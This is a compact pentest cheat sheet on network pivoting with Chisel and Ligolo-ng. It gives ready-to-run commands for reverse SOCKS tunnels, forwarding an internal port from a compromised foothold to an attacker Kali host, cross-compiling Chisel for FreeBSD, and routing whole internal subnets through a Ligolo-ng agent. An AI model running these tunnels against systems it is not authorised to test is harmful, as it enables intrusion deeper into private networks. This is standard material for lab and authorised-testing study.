# Chisel and Ligolo-ng

Chisel = reverse SOCKS / single port. Ligolo-ng = routed subnet (TUN). Note listener, route, subnet.

## Chisel reverse SOCKS
```bash
# Kali
./chisel server -p 8080 --reverse

# Foothold
./chisel client <KALI>:8080 R:1080:socks
```
- `R:1080:socks` = SOCKS5 on Kali `127.0.0.1:1080` → proxychains `socks5 127.0.0.1 1080`. Nmap: `-sT -Pn` only.

One internal service on Kali:
```bash
./chisel client <KALI>:8080 R:3389:<IP>:3389
```
- Confirm the service from the foothold; Kali listens on 3389.

## Cross-compile Chisel
```bash
# Target
uname -s
uname -m
```
```bash
# Kali: use the same tag as the server
git clone https://github.com/jpillora/chisel.git chisel-src
cd chisel-src
git checkout <CHISEL-TAG>
go tool dist list | grep '^freebsd/'

CGO_ENABLED=0 GOOS=freebsd GOARCH=amd64 go build -trimpath \
  -ldflags "-s -w -X github.com/jpillora/chisel/share.BuildVersion=$(git describe --abbrev=0 --tags)" \
  -o chisel-freebsd-amd64 .

file chisel-freebsd-amd64
sha256sum chisel-freebsd-amd64
```
```sh
# Target
chmod +x ./chisel-freebsd-amd64
./chisel-freebsd-amd64 --version
./chisel-freebsd-amd64 client <KALI>:8080 R:1080:socks
```
- `x86_64` → `GOARCH=amd64`, `i386` → `386`, `aarch64` → `arm64`.
- Tag mismatch with the server → version error.
- Current Chisel needs FreeBSD ≥ 12.2; older target → older Chisel + Go.

## Ligolo-ng
Proxy on Kali, agent on the foothold. Ligolo creates the TUN interface and routes itself: do not also run `ip tuntap` / `ip route add`.

```bash
# Kali (default listener TCP 11601)
sudo ligolo-proxy -selfcert
```
```powershell
# Foothold (Linux: ./agent)
.\agent -connect <KALI>:11601 -ignore-cert
```
- `-ignore-cert` = no validation: only with the self-signed proxy cert.

After `Agent joined`, in the proxy console:
```text
session
autoroute
```
or manually:
```text
ifcreate --name pivot
session
tunnel_start --tun pivot
route_add --name pivot --route <SUBNET>/24
```
- `session`: select the agent when prompted.
- Route the network address (`172.16.107.0/24`), not the host (`172.16.107.14/24`).
- `Agent joined` = control connection only. Test one known port from Kali.
- Duplicate interface/route → check `interface_list`; managed routes persist in `ligolo-ng.yaml`.
- Command names differ by version (`interface_create` = `ifcreate`; `route_add` = `interface_add_route`): check `help`.

Listener on the agent (reverse connection to Kali):
```text
listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT> --tcp
```
- Verify direction with one connection. Remove stale routes/listeners when done (`route_del`, `listener_stop`).
